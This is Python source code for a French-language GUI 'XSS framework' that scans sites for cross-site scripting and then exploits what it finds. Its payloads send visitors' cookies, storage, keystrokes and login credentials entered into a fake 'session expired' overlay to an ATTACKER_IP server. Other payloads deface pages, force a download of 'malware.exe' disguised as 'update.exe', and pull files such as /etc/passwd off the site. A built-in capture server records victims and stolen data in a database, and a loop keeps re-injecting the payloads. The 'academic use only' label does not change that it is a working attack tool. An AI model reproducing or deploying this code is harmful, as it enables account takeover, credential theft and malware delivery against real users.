#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS FRAMEWORK ULTIME - PERSISTANCE COMPLÈTE - JATHNIEL EDITION
Framework complet XSS avec persistance, upload/download, XSS stocké
Usage académique et légal uniquement
"""

import sys
import os
import time
import json
import threading
import base64
import hashlib
import re
import subprocess
import sqlite3
from datetime import datetime
from typing import Optional, Dict, List, Any
from urllib.parse import urlparse, parse_qs, urljoin
import socket
import webbrowser

try:
    from PySide6.QtWidgets import *
    from PySide6.QtCore import *
    from PySide6.QtGui import *
    QT_AVAILABLE = True
except ImportError:
    QT_AVAILABLE = False
    print("[!] PySide6 non installé. Installation...")
    os.system("pip install PySide6")
    try:
        from PySide6.QtWidgets import *
        from PySide6.QtCore import *
        from PySide6.QtGui import *
        QT_AVAILABLE = True
    except:
        print("[!] Erreur: PySide6 requis. Installez avec: pip install PySide6")
        sys.exit(1)

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[!] requests non installé. pip install requests")

# ==================== CONFIGURATION ====================

CONFIG = {
    'title': 'XSS FRAMEWORK ULTIME - PERSISTANCE - JATHNIEL EDITION',
    'version': '3.0',
    'author': 'JATHNIEL'
}

# ==================== BASE DE DONNÉES ====================

class Database:
    """Gestionnaire de base de données pour la persistance"""
    
    def __init__(self):
        self.db_path = 'xss_persist.db'
        self.init_db()
    
    def init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS persistent_payloads (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    url TEXT,
                    param TEXT,
                    payload TEXT,
                    target TEXT,
                    status TEXT,
                    created_at TEXT,
                    last_executed TEXT,
                    execution_count INTEGER DEFAULT 0
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS victims (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    user_agent TEXT,
                    cookies TEXT,
                    first_seen TEXT,
                    last_seen TEXT
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS stolen_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id INTEGER,
                    data_type TEXT,
                    data TEXT,
                    captured_at TEXT,
                    FOREIGN KEY (victim_id) REFERENCES victims (id)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id INTEGER,
                    session_cookie TEXT,
                    active INTEGER DEFAULT 1,
                    created_at TEXT,
                    expires_at TEXT,
                    FOREIGN KEY (victim_id) REFERENCES victims (id)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS downloads (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    file_name TEXT,
                    file_path TEXT,
                    content TEXT,
                    downloaded_at TEXT
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS uploads (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    local_file TEXT,
                    remote_path TEXT,
                    uploaded_at TEXT
                )
            ''')
            
            conn.commit()
    
    def execute(self, query, params=()):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
            return cursor.lastrowid
    
    def fetch_all(self, query, params=()):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            return cursor.fetchall()
    
    def add_payload(self, url, param, payload, target):
        return self.execute('''
            INSERT INTO persistent_payloads 
            (url, param, payload, target, status, created_at)
            VALUES (?, ?, ?, ?, 'active', ?)
        ''', (url, param, payload, target, datetime.now().isoformat()))
    
    def get_payloads(self):
        return self.fetch_all('SELECT * FROM persistent_payloads WHERE status = "active"')
    
    def add_download(self, file_name, file_path, content):
        return self.execute('''
            INSERT INTO downloads (file_name, file_path, content, downloaded_at)
            VALUES (?, ?, ?, ?)
        ''', (file_name, file_path, content, datetime.now().isoformat()))
    
    def add_upload(self, local_file, remote_path):
        return self.execute('''
            INSERT INTO uploads (local_file, remote_path, uploaded_at)
            VALUES (?, ?, ?)
        ''', (local_file, remote_path, datetime.now().isoformat()))
    
    def add_victim(self, ip, user_agent, cookies):
        return self.execute('''
            INSERT INTO victims (ip, user_agent, cookies, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?)
        ''', (ip, user_agent, cookies, datetime.now().isoformat(), datetime.now().isoformat()))
    
    def add_stolen_data(self, victim_id, data_type, data):
        return self.execute('''
            INSERT INTO stolen_data (victim_id, data_type, data, captured_at)
            VALUES (?, ?, ?, ?)
        ''', (victim_id, data_type, data, datetime.now().isoformat()))
    
    def add_session(self, victim_id, session_cookie):
        return self.execute('''
            INSERT INTO sessions (victim_id, session_cookie, active, created_at, expires_at)
            VALUES (?, ?, 1, ?, ?)
        ''', (victim_id, session_cookie, datetime.now().isoformat(), 
              (datetime.now().timestamp() + 3600 * 24 * 7)))

# ==================== XSS EXPLOIT ENGINE ====================

class XSSExploitEngine(QObject):
    """Moteur d'exploitation XSS complet avec persistance"""
    
    status_changed = Signal(str)
    vuln_detected = Signal(str, str, str)
    cookie_captured = Signal(str, str, str)
    file_downloaded = Signal(str, str)
    file_uploaded = Signal(str, str)
    victim_registered = Signal(str, str)
    
    def __init__(self):
        super().__init__()
        self.db = Database()
        self.running = False
        self.vulnerabilities = []
        self.cookies = []
        self.victims = {}
        self.active_sessions = {}
        self.payload_server = None
        self.cookie_server = None
        self.persist_thread = None
        self.persist_running = False
        
        self.exploit_payloads = {
            'cookie_steal': "new Image().src='http://ATTACKER_IP:8080/steal?c='+encodeURIComponent(document.cookie)",
            'persistent_session': """
                var cookie = document.cookie;
                fetch('http://ATTACKER_IP:8080/session?c='+encodeURIComponent(cookie), {mode:'no-cors'});
                localStorage.setItem('persistent_session', cookie);
                setInterval(function() {
                    var current = document.cookie;
                    var stored = localStorage.getItem('persistent_session');
                    if (current !== stored) {
                        fetch('http://ATTACKER_IP:8080/session?c='+encodeURIComponent(current), {mode:'no-cors'});
                        localStorage.setItem('persistent_session', current);
                    }
                }, 300000);
            """,
            'stored_xss': """
                (function() {
                    var data = {
                        url: window.location.href,
                        cookie: document.cookie,
                        localStorage: JSON.stringify(localStorage),
                        sessionStorage: JSON.stringify(sessionStorage),
                        userAgent: navigator.userAgent,
                        screen: screen.width + 'x' + screen.height
                    };
                    fetch('http://ATTACKER_IP:8080/stored?d='+encodeURIComponent(JSON.stringify(data)), {mode:'no-cors'});
                    var script = document.createElement('script');
                    script.src = 'http://ATTACKER_IP:8080/beacon.js?' + Date.now();
                    document.head.appendChild(script);
                })();
            """,
            'beacon': """
                (function() {
                    var interval = 60000;
                    setInterval(function() {
                        var data = {
                            cookie: document.cookie,
                            url: window.location.href,
                            time: new Date().toISOString()
                        };
                        fetch('http://ATTACKER_IP:8080/beacon?d='+encodeURIComponent(JSON.stringify(data)), {mode:'no-cors'});
                    }, interval);
                })();
            """,
            'session_steal': "fetch('http://ATTACKER_IP:8080/steal?c='+encodeURIComponent(document.cookie), {mode:'no-cors'})",
            'keylogger': """
                document.addEventListener('keydown', function(e) {
                    fetch('http://ATTACKER_IP:8080/keylog?k='+encodeURIComponent(e.key));
                });
            """,
            'persistent_keylog': """
                var keys = [];
                document.addEventListener('keydown', function(e) {
                    keys.push(e.key);
                    if (keys.length > 10) {
                        fetch('http://ATTACKER_IP:8080/keylog?d='+encodeURIComponent(JSON.stringify(keys)), {mode:'no-cors'});
                        keys = [];
                    }
                });
                window.addEventListener('beforeunload', function() {
                    if (keys.length > 0) {
                        navigator.sendBeacon('http://ATTACKER_IP:8080/keylog', JSON.stringify(keys));
                    }
                });
            """,
            'phishing': """
                var form = document.createElement('div');
                form.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;"><div style="background:white;padding:20px;max-width:400px;margin:100px auto;border-radius:10px;"><h2>Session expirée</h2><p>Veuillez vous reconnecter</p><input type="text" id="fake_user" placeholder="Email"><input type="password" id="fake_pass" placeholder="Mot de passe"><button onclick="fetch(\'http://ATTACKER_IP:8080/phish?u=\'+document.getElementById(\'fake_user\').value+\'&p=\'+document.getElementById(\'fake_pass\').value)">Se connecter</button></div></div>';
                document.body.appendChild(form);
            """,
            'deface': """
                document.body.innerHTML = '<h1 style="color:red;text-align:center;font-size:48px;">HACKED BY JATHNIEL</h1><p style="text-align:center;font-size:24px;">This site has been defaced for educational purposes</p><p style="text-align:center;font-size:18px;color:#666;">Persistent XSS demonstration</p>';
            """,
            'redirect': "window.location='http://ATTACKER_IP:8080/fake'",
            'download_exec': """
                var link = document.createElement('a');
                link.href = 'http://ATTACKER_IP:8080/malware.exe';
                link.download = 'update.exe';
                document.body.appendChild(link);
                link.click();
            """
        }
    
    # ==================== PERSISTANCE ====================
    
    def start_persistence(self):
        self.persist_running = True
        self.persist_thread = threading.Thread(target=self.persistence_loop, daemon=True)
        self.persist_thread.start()
        self.status_changed.emit("🔄 Persistance activée")
    
    def stop_persistence(self):
        self.persist_running = False
        self.status_changed.emit("🔄 Persistance désactivée")
    
    def persistence_loop(self):
        while self.persist_running:
            try:
                payloads = self.db.get_payloads()
                for payload in payloads:
                    payload_id, url, param, payload_code, target, status, created, last_exec, count = payload
                    if status == 'active':
                        test_url = url.replace(param, payload_code[:50])
                        try:
                            response = requests.get(test_url, timeout=10, verify=False)
                            if self.check_payload_in_response(payload_code, response.text):
                                self.db.execute(
                                    'UPDATE persistent_payloads SET last_executed = ?, execution_count = ? WHERE id = ?',
                                    (datetime.now().isoformat(), count + 1, payload_id)
                                )
                            else:
                                self.reinject_payload(payload_id, url, param, payload_code)
                        except:
                            pass
                time.sleep(60)
            except Exception as e:
                self.status_changed.emit(f"❌ Erreur persistance: {e}")
                time.sleep(60)
    
    def check_payload_in_response(self, payload, response):
        return payload in response
    
    def reinject_payload(self, payload_id, url, param, payload):
        try:
            test_url = url.replace(param, payload[:50])
            response = requests.get(test_url, timeout=10, verify=False)
            if self.check_payload_in_response(payload, response.text):
                self.db.execute(
                    'UPDATE persistent_payloads SET status = "active" WHERE id = ?',
                    (payload_id,)
                )
                self.status_changed.emit(f"🔄 Payload réinjecté: {param}")
        except:
            pass
    
    def create_persistent_payload(self, vuln, payload_type, attacker_ip, port=8080):
        payload = self.generate_exploit_payload(vuln, payload_type, attacker_ip, port)
        self.db.add_payload(
            url=vuln['url'],
            param=vuln['param'],
            payload=payload,
            target=attacker_ip
        )
        return self.execute_payload(vuln, payload)
    
    # ==================== TÉLÉCHARGEMENT ====================
    
    def download_file_from_site(self, vuln: Dict, file_path: str) -> bool:
        """Télécharge un fichier depuis le site vulnérable (Site → Moi)"""
        self.status_changed.emit(f"📥 Téléchargement de {file_path}")
        
        payload = f"""
        // Télécharger le fichier cible
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '{file_path}', true);
        xhr.onload = function() {{
            if (xhr.status === 200) {{
                var content = btoa(xhr.responseText);
                fetch('http://ATTACKER_IP:8080/download?f=' + encodeURIComponent('{file_path}') + '&d=' + encodeURIComponent(content));
            }}
        }};
        xhr.send();
        """
        
        result = self.execute_payload(vuln, payload)
        if result:
            self.db.add_download(
                file_name=os.path.basename(file_path),
                file_path=file_path,
                content="pending"
            )
            self.file_downloaded.emit(file_path, "Téléchargement initié")
        return result
    
    def upload_file_to_site(self, vuln: Dict, local_file: str, remote_path: str) -> bool:
        """Upload un fichier sur le site vulnérable (Moi → Site)"""
        if not os.path.exists(local_file):
            self.status_changed.emit(f"❌ Fichier local non trouvé: {local_file}")
            return False
        
        self.status_changed.emit(f"📤 Upload de {local_file} vers {remote_path}")
        
        with open(local_file, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
        
        payload = f"""
        // Upload le fichier
        var fileContent = atob('{content}');
        var blob = new Blob([fileContent], {{type: 'application/octet-stream'}});
        var formData = new FormData();
        formData.append('file', blob, '{os.path.basename(local_file)}');
        formData.append('path', '{remote_path}');
        
        fetch('{vuln['url']}', {{
            method: 'POST',
            body: formData
        }});
        """
        
        result = self.execute_payload(vuln, payload)
        if result:
            self.db.add_upload(local_file, remote_path)
            self.file_uploaded.emit(local_file, remote_path)
        return result
    
    def force_download_on_victim(self, vuln: Dict, file_url: str) -> bool:
        """Force le téléchargement d'un fichier sur la machine de la victime"""
        self.status_changed.emit(f"📥 Téléchargement forcé: {file_url}")
        
        payload = f"""
        var link = document.createElement('a');
        link.href = '{file_url}';
        link.download = 'update.exe';
        document.body.appendChild(link);
        link.click();
        """
        
        return self.execute_payload(vuln, payload)
    
    # ==================== SCAN XSS ====================
    
    def scan_url(self, url: str) -> List[Dict]:
        self.status_changed.emit(f"🔍 Scan de {url}")
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            self.status_changed.emit("⚠️ Aucun paramètre trouvé")
            return []
        
        for param in params:
            for payload in self.get_test_payloads():
                test_url = self.build_test_url(url, param, payload)
                try:
                    response = requests.get(test_url, timeout=10, verify=False)
                    if self.check_reflection(payload, response.text):
                        vuln = {
                            'param': param,
                            'payload': payload,
                            'url': test_url,
                            'method': 'GET',
                            'severity': 'HIGH',
                            'type': 'REFLECTED_XSS'
                        }
                        vulnerabilities.append(vuln)
                        self.vuln_detected.emit(param, payload, test_url)
                        self.status_changed.emit(f"🚨 XSS trouvé sur {param}")
                except:
                    pass
        
        self.vulnerabilities = vulnerabilities
        self.status_changed.emit(f"✅ Scan terminé: {len(vulnerabilities)} vulnérabilités")
        return vulnerabilities
    
    def scan_stored_xss(self, url, form_data):
        self.status_changed.emit("🔍 Test de XSS stocké...")
        test_payloads = [
            "<script>alert('Stored XSS')</script>",
            "<img src=x onerror=alert('Stored XSS')>",
            "<svg onload=alert('Stored XSS')>"
        ]
        
        vulnerabilities = []
        for payload in test_payloads:
            try:
                data = form_data.copy()
                for key in data:
                    if 'comment' in key.lower() or 'message' in key.lower() or 'text' in key.lower():
                        data[key] = payload
                
                response = requests.post(url, data=data, timeout=10, verify=False)
                if self.check_reflection(payload, response.text):
                    vuln = {
                        'param': 'stored_form',
                        'payload': payload,
                        'url': url,
                        'method': 'POST',
                        'severity': 'CRITICAL',
                        'type': 'STORED_XSS'
                    }
                    vulnerabilities.append(vuln)
                    self.vuln_detected.emit('stored_form', payload, url)
                    self.status_changed.emit(f"🚨 XSS STOCKÉ trouvé!")
            except:
                pass
        
        return vulnerabilities
    
    def get_test_payloads(self):
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>"
        ]
    
    def build_test_url(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        query = '&'.join([f"{k}={v[0]}" for k, v in params.items()])
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
    
    def check_reflection(self, payload: str, response: str) -> bool:
        if payload in response:
            return True
        encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        if encoded in response:
            return True
        clean = re.sub(r'<[^>]+>', '', payload)
        if len(clean) > 3 and clean in response:
            return True
        return False
    
    def generate_exploit_payload(self, vuln: Dict, exploit_type: str, attacker_ip: str, port: int = 8080) -> str:
        payload_template = self.exploit_payloads.get(exploit_type, "")
        if not payload_template:
            return ""
        return payload_template.replace("ATTACKER_IP", attacker_ip).replace("8080", str(port))
    
    def execute_payload(self, vuln: Dict, payload: str) -> bool:
        try:
            url = vuln['url']
            test_url = url.replace(vuln['payload'], payload)
            response = requests.get(test_url, timeout=10, verify=False)
            self.status_changed.emit(f"✅ Payload exécuté sur {vuln['param']}")
            return True
        except Exception as e:
            self.status_changed.emit(f"❌ Erreur: {e}")
            return False
    
    # ==================== SERVEUR DE CAPTURE ====================
    
    def start_cookie_server(self, port: int = 8080):
        self.status_changed.emit(f"🖥️ Serveur de capture sur le port {port}")
        
        def serve():
            try:
                import http.server
                import socketserver
                import urllib.parse
                
                class CaptureHandler(http.server.SimpleHTTPRequestHandler):
                    def do_GET(self):
                        parsed = urllib.parse.urlparse(self.path)
                        params = urllib.parse.parse_qs(parsed.query)
                        
                        if '/steal' in self.path:
                            cookie = params.get('c', [''])[0]
                            if cookie:
                                try:
                                    cookie = urllib.parse.unquote(cookie)
                                    victim_id = self.server.db.add_victim(
                                        self.client_address[0],
                                        self.headers.get('User-Agent', 'Unknown'),
                                        cookie
                                    )
                                    self.server.db.add_stolen_data(
                                        victim_id,
                                        'cookie',
                                        cookie
                                    )
                                    self.status_changed.emit(f"🍪 Cookie capturé: {cookie[:50]}...")
                                    self.cookie_captured.emit(cookie, self.client_address[0], datetime.now().isoformat())
                                except:
                                    pass
                            self.send_response(200)
                            self.end_headers()
                            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x01\x00\x00')
                        
                        elif '/session' in self.path:
                            cookie = params.get('c', [''])[0]
                            if cookie:
                                try:
                                    cookie = urllib.parse.unquote(cookie)
                                    victim_id = self.server.db.add_victim(
                                        self.client_address[0],
                                        self.headers.get('User-Agent', 'Unknown'),
                                        cookie
                                    )
                                    self.server.db.add_session(victim_id, cookie)
                                    self.status_changed.emit(f"🔄 Session persistante: {cookie[:30]}...")
                                except:
                                    pass
                            self.send_response(200)
                            self.end_headers()
                        
                        elif '/download' in self.path:
                            file_path = params.get('f', [''])[0]
                            content = params.get('d', [''])[0]
                            if file_path and content:
                                try:
                                    file_path = urllib.parse.unquote(file_path)
                                    content = urllib.parse.unquote(content)
                                    self.server.db.add_download(
                                        file_name=os.path.basename(file_path),
                                        file_path=file_path,
                                        content=content
                                    )
                                    self.status_changed.emit(f"📥 Fichier téléchargé: {file_path}")
                                except:
                                    pass
                            self.send_response(200)
                            self.end_headers()
                        
                        elif '/stored' in self.path:
                            data = params.get('d', [''])[0]
                            if data:
                                try:
                                    data = urllib.parse.unquote(data)
                                    data = json.loads(data)
                                    victim_id = self.server.db.add_victim(
                                        self.client_address[0],
                                        data.get('userAgent', 'Unknown'),
                                        data.get('cookie', '')
                                    )
                                    self.server.db.add_stolen_data(
                                        victim_id,
                                        'stored_xss',
                                        json.dumps(data)
                                    )
                                except:
                                    pass
                            self.send_response(200)
                            self.end_headers()
                        
                        elif '/beacon' in self.path:
                            data = params.get('d', [''])[0]
                            if data:
                                try:
                                    data = urllib.parse.unquote(data)
                                    self.status_changed.emit(f"📡 Beacon reçu")
                                except:
                                    pass
                            self.send_response(200)
                            self.end_headers()
                        
                        elif '/keylog' in self.path:
                            key = params.get('k', [''])[0]
                            if key:
                                try:
                                    key = urllib.parse.unquote(key)
                                    self.status_changed.emit(f"⌨️ Touche: {key}")
                                except:
                                    pass
                            self.send_response(200)
                            self.end_headers()
                        
                        elif '/phish' in self.path:
                            user = params.get('u', [''])[0]
                            password = params.get('p', [''])[0]
                            if user and password:
                                try:
                                    user = urllib.parse.unquote(user)
                                    password = urllib.parse.unquote(password)
                                    victim_id = self.server.db.add_victim(
                                        self.client_address[0],
                                        self.headers.get('User-Agent', 'Unknown'),
                                        ''
                                    )
                                    self.server.db.add_stolen_data(
                                        victim_id,
                                        'credentials',
                                        json.dumps({'username': user, 'password': password})
                                    )
                                    self.status_changed.emit(f"🎣 Identifiants: {user}:{password}")
                                except:
                                    pass
                            self.send_response(200)
                            self.send_header('Location', 'https://www.google.com')
                            self.end_headers()
                        
                        else:
                            self.send_response(404)
                            self.end_headers()
                    
                    def log_message(self, format, *args):
                        pass
                
                self.cookie_server = socketserver.TCPServer(('0.0.0.0', port), CaptureHandler)
                self.cookie_server.db = self.db
                self.cookie_server.cookies = []
                self.cookie_server.keylogs = []
                self.cookie_server.sessions = []
                self.cookie_server.phished = []
                self.cookie_server.serve_forever()
                
            except Exception as e:
                self.status_changed.emit(f"❌ Erreur serveur: {e}")
        
        threading.Thread(target=serve, daemon=True).start()

# ==================== INTERFACE PRINCIPALE ====================

class XSSFrameworkGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.engine = XSSExploitEngine()
        self.vulnerabilities = []
        self.current_vuln = None
        self.attacker_ip = self.get_local_ip()
        self.persist_active = False
        self.setup_ui()
        self.connect_signals()
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    def setup_ui(self):
        self.setWindowTitle(CONFIG['title'])
        self.setGeometry(100, 100, 1400, 850)
        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a2e; }
            QWidget { background-color: #1a1a2e; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; }
            QPushButton {
                background-color: #2d2d44; color: #e0e0e0;
                border: 1px solid #4a4a6a; border-radius: 6px;
                padding: 8px 16px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #3d3d5a; }
            QPushButton#danger { background-color: #6a2d2d; border-color: #8a3d3d; }
            QPushButton#danger:hover { background-color: #8a3d3d; }
            QPushButton#success { background-color: #2d6a2d; border-color: #3d8a3d; }
            QPushButton#success:hover { background-color: #3d8a3d; }
            QPushButton#primary { background-color: #2d2d6a; border-color: #3d3d8a; }
            QPushButton#primary:hover { background-color: #3d3d8a; }
            QPushButton#warning { background-color: #6a5a2d; border-color: #8a7a3d; }
            QPushButton#warning:hover { background-color: #8a7a3d; }
            QLineEdit, QTextEdit, QComboBox {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                padding: 8px;
                color: #e0e0e0;
                font-family: 'Consolas', monospace;
            }
            QTabWidget::pane {
                border: 1px solid #2d2d44;
                border-radius: 6px;
                background-color: #1a1a2e;
            }
            QTabBar::tab {
                background-color: #2d2d44;
                padding: 8px 16px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected { background-color: #3d3d5a; }
            QStatusBar { background-color: #0d0d1a; color: #8888aa; }
            QGroupBox {
                border: 1px solid #2d2d44;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title { color: #00ff88; subcontrol-origin: margin; left: 10px; }
            QLabel { color: #e0e0e0; }
            QListWidget {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
            }
            QListWidget::item { padding: 8px; border-radius: 4px; }
            QListWidget::item:selected { background-color: #2d2d44; }
            QTableWidget {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                gridline-color: #2d2d44;
            }
            QTableWidget::item { color: #e0e0e0; }
            QHeaderView::section {
                background-color: #2d2d44;
                padding: 8px;
                border: none;
                color: #00ff88;
            }
            QCheckBox { color: #e0e0e0; }
            QProgressBar {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                text-align: center;
                color: #e0e0e0;
                height: 20px;
            }
            QProgressBar::chunk { background-color: #4F46E5; border-radius: 6px; }
        """)
        
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(10, 10, 10, 10)
        
        header = QLabel(f"🚀 XSS FRAMEWORK ULTIME - PERSISTANCE - {CONFIG['author']}")
        header.setStyleSheet("font-size: 20px; font-weight: bold; color: #00ff88; padding: 10px;")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)
        
        self.tabs = QTabWidget()
        
        self.scan_tab = self.create_scan_tab()
        self.tabs.addTab(self.scan_tab, "🔍 Scan")
        
        self.exploit_tab = self.create_exploit_tab()
        self.tabs.addTab(self.exploit_tab, "💥 Exploitation")
        
        self.persist_tab = self.create_persist_tab()
        self.tabs.addTab(self.persist_tab, "🔄 Persistance")
        
        self.download_tab = self.create_download_tab()
        self.tabs.addTab(self.download_tab, "📥 Téléchargement")
        
        self.upload_tab = self.create_upload_tab()
        self.tabs.addTab(self.upload_tab, "📤 Upload")
        
        self.stored_tab = self.create_stored_tab()
        self.tabs.addTab(self.stored_tab, "💾 XSS Stocké")
        
        self.data_tab = self.create_data_tab()
        self.tabs.addTab(self.data_tab, "📊 Données")
        
        self.console_tab = self.create_console_tab()
        self.tabs.addTab(self.console_tab, "📟 Console")
        
        layout.addWidget(self.tabs)
        
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("✅ Prêt")
    
    def create_scan_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        url_group = QGroupBox("🎯 Cible")
        url_layout = QHBoxLayout()
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com/page?id=1")
        url_layout.addWidget(self.url_input)
        scan_btn = QPushButton("🔍 Scanner")
        scan_btn.setObjectName("primary")
        scan_btn.clicked.connect(self.start_scan)
        url_layout.addWidget(scan_btn)
        url_group.setLayout(url_layout)
        layout.addWidget(url_group)
        
        results_group = QGroupBox("📊 Vulnérabilités")
        results_layout = QVBoxLayout()
        self.vuln_list = QListWidget()
        self.vuln_list.itemClicked.connect(self.on_vuln_selected)
        results_layout.addWidget(self.vuln_list)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        info_group = QGroupBox("📋 Détails")
        info_layout = QGridLayout()
        info_layout.addWidget(QLabel("Paramètre:"), 0, 0)
        self.vuln_param = QLabel("-")
        info_layout.addWidget(self.vuln_param, 0, 1)
        info_layout.addWidget(QLabel("Payload:"), 1, 0)
        self.vuln_payload = QLabel("-")
        info_layout.addWidget(self.vuln_payload, 1, 1)
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        return tab
    
    def create_exploit_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        config_group = QGroupBox("⚙️ Configuration")
        config_layout = QGridLayout()
        config_layout.addWidget(QLabel("IP de l'attaquant:"), 0, 0)
        self.ip_input = QLineEdit()
        self.ip_input.setText(self.attacker_ip)
        config_layout.addWidget(self.ip_input, 0, 1)
        config_layout.addWidget(QLabel("Port:"), 1, 0)
        self.port_input = QLineEdit()
        self.port_input.setText("8080")
        config_layout.addWidget(self.port_input, 1, 1)
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        actions_group = QGroupBox("💥 Actions")
        actions_layout = QVBoxLayout()
        exploit_btns = [
            ("🍪 Vol de cookies", self.steal_cookies),
            ("🎣 Phishing", self.inject_phishing),
            ("🎨 Défiguration", self.deface_page),
            ("🔄 Redirection", self.redirect_to),
            ("⌨️ Keylogger", self.inject_keylogger),
            ("🔄 Session persistante", self.inject_persistent_session),
            ("📡 Beacon", self.inject_beacon)
        ]
        for label, func in exploit_btns:
            btn = QPushButton(label)
            btn.setObjectName("warning")
            btn.clicked.connect(func)
            actions_layout.addWidget(btn)
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        server_group = QGroupBox("🖥️ Serveur de capture")
        server_layout = QHBoxLayout()
        self.server_btn = QPushButton("🚀 Démarrer le serveur")
        self.server_btn.setObjectName("success")
        self.server_btn.clicked.connect(self.start_server)
        server_layout.addWidget(self.server_btn)
        self.stop_server_btn = QPushButton("🛑 Arrêter le serveur")
        self.stop_server_btn.setObjectName("danger")
        self.stop_server_btn.clicked.connect(self.stop_server)
        self.stop_server_btn.setEnabled(False)
        server_layout.addWidget(self.stop_server_btn)
        server_group.setLayout(server_layout)
        layout.addWidget(server_group)
        
        return tab
    
    def create_persist_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        status_group = QGroupBox("🔄 État de la persistance")
        status_layout = QVBoxLayout()
        self.persist_status = QLabel("⏸️ Inactive")
        self.persist_status.setStyleSheet("font-size: 16px;")
        status_layout.addWidget(self.persist_status)
        btn_layout = QHBoxLayout()
        self.persist_start_btn = QPushButton("▶️ Démarrer la persistance")
        self.persist_start_btn.setObjectName("success")
        self.persist_start_btn.clicked.connect(self.start_persistence)
        btn_layout.addWidget(self.persist_start_btn)
        self.persist_stop_btn = QPushButton("⏹️ Arrêter la persistance")
        self.persist_stop_btn.setObjectName("danger")
        self.persist_stop_btn.clicked.connect(self.stop_persistence)
        self.persist_stop_btn.setEnabled(False)
        btn_layout.addWidget(self.persist_stop_btn)
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
        
        payloads_group = QGroupBox("📦 Payloads persistants")
        payloads_layout = QVBoxLayout()
        self.persist_payloads_list = QListWidget()
        payloads_layout.addWidget(self.persist_payloads_list)
        refresh_btn = QPushButton("🔄 Rafraîchir")
        refresh_btn.clicked.connect(self.refresh_persist_payloads)
        payloads_layout.addWidget(refresh_btn)
        payloads_group.setLayout(payloads_layout)
        layout.addWidget(payloads_group)
        
        return tab
    
    def create_download_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        info = QLabel("📥 Téléchargement depuis le site (Site → Moi)")
        info.setStyleSheet("color: #8888aa; font-size: 14px;")
        layout.addWidget(info)
        
        download_group = QGroupBox("🎯 Télécharger un fichier")
        download_layout = QGridLayout()
        download_layout.addWidget(QLabel("Chemin du fichier:"), 0, 0)
        self.download_path = QLineEdit()
        self.download_path.setPlaceholderText("/etc/passwd, /config.php, /database.sql")
        download_layout.addWidget(self.download_path, 0, 1)
        download_btn = QPushButton("📥 Télécharger")
        download_btn.setObjectName("primary")
        download_btn.clicked.connect(self.download_file)
        download_layout.addWidget(download_btn, 1, 0, 1, 2)
        download_group.setLayout(download_layout)
        layout.addWidget(download_group)
        
        history_group = QGroupBox("📋 Historique des téléchargements")
